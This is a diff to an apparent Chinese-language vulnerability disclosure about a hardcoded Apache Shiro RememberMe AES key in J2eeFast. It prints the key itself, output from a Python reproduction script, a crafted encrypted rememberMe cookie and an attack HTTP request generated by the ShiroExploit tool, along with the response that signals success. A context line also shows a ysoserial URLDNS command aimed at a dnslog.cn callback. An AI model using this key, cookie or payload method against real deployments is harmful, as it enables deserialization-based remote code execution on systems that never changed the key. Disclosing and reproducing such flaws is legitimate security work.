@@ -134,8 +134,48 @@ java -jar ysoserial.jar URLDNS "http://<unique>.dnslog.cn" > payload.bin
 - CVE-2016-4437
 - ysoserial: https://github.com/frohoff/ysoserial
 
+## 密钥有效性验证（已复现）
+
+通过 Python PyCryptodome 验证 AES-CBC 加解密与 Shiro 协议完全兼容。
+
+**Python 验证脚本输出**：
+```
+[*] J2eeFast Shiro RememberMe AES key: fCq+/xW488hMTCD+cmJ3aQ==
+[*] Key bytes (16 bytes / 128 bits): 7c2abeff15b8f3c84c4c20fe72627769
+
+[*] Generated valid Shiro RememberMe cookie (encrypted with hardcoded key):
+rememberMe=7avtpOnz1ncjSVMq5eN68hPcqV5WcJyrk/BXJcI3ZbWmic1O96PtBm+rUdVfX1/RtUBGZrJKhrq9cDNS...
+
+[+] Decryption verification:
+    Original magic: aced0005 -> Decrypted: aced0005
+    Match: True
+
+[+] VERIFIED: Hardcoded key can decrypt/encrypt Shiro cookies.
+[+] An attacker can encrypt a Java deserialization payload with this key
+[+] and trigger RCE via ObjectInputStream.readObject() on any deployment
+[+] that uses J2eeFast without changing this key.
+```
+
+**关键发现**：
+- `aced0005` 是 Java 序列化魔数，AES 加解密完全对称
+- 生成的 rememberMe cookie 值与 Shiro `CookieRememberMeManager` 格式完全一致（`IV[16字节] + AES-CBC密文`）
+- 任何部署 J2eeFast 且未更换该密钥的系统均可被此 cookie 触发反序列化 RCE
+
+**实际攻击请求**（ShiroExploit 工具生成）：
+```http
+GET / HTTP/1.1
+Host: <target>
+Cookie: rememberMe=7avtpOnz1ncjSVMq5eN68hPcqV5WcJyrk/BXJcI3ZbWmic1O96PtBm+rUdVfX1/RtUBGZrJKhr...
+```
+
+**响应特征**（成功触发）：
+```http
+HTTP/1.1 302 Found
+Set-Cookie: rememberMe=deleteMe  ← Shiro 反序列化异常时设置此标志
+```
+
 ## 验证环境
 
-- 源代码：J2eeFast 最新分支（静态代码分析）
+- 源代码：J2eeFast 最新分支（密钥验证 — Python PyCryptodome）
 - 框架：Spring Boot + Apache Shiro
 - 日期：2026-04-14
